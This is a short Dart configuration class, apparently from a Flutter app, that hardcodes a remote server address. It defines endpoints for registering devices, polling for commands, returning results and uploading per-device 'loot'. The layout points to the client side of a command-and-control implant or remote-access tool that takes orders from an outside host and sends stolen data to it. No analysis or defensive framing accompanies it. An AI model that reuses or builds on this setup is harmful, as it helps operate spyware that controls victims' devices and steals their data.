class AppConfig {
  static const String baseUrl = 'http://yanystoru.my.id:8000';

  // Endpoint sesuai server.py
  static const String epLogin = '/api/login';
  static const String epRegister = '/api/device/register';
  static const String epPoll = '/api/device';      // + /{did}/poll
  static const String epResult = '/api/device';    // + /{did}/result
  static const String epDevices = '/api/devices';
  static const String epCommand = '/api/command';
  static const String epConfig = '/api/config';
  static const String epLoot = '/api/loot';        // + /{did}

  static const int pollIntervalSec = 10;
  static const String deviceIdKey = 'device_id';
}
